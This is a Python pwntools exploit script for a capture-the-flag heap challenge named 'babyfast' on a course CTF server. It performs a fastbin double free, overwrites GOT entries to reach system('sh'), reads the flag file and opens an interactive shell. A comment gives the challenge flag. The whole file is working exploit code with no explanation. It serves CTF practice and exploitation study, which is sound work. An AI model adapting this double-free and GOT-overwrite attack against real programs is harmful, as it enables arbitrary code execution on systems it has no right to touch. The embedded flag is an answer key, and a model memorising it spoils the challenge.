#!/usr/bin/env python
from pwn import *

# FLAG{FASTER~~~~}

e = ELF( './babyfast-d4f44b92382b4bb11257ea06622644b26d2d06fe' )

host , port = 'csie.ctf.tw' , 10142
y = remote( host , port )


def alloc( size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def free( idx ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( ':' , str( idx ) )


alloc( 0x38 , 'yuawn' )
alloc( 0x38 , 'yuawn' )

free( 1 )
free( 0 )
free( 1 )

alloc( 0x38 , p64( 0x602030 + 2 ) )
alloc( 0x38 , 'yuawn' )
alloc( 0x38 , 'yuawn' )

call_system = 0x400b31

alloc( 0x38 , 'sh\x00\x00\x00\x00' + p64( 0x4007e6 ) + p64( 0x4007f6 ) + 'sh\x00\x00\x00\x00\x00\x00' + p64( 0x400816 ) + p64( 0x400826 ) + p64( 0x4007d6 )  )


y.sendafter( 'ice :' , '1' )
y.sendafter( ':' , str( 0x602058 ) )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()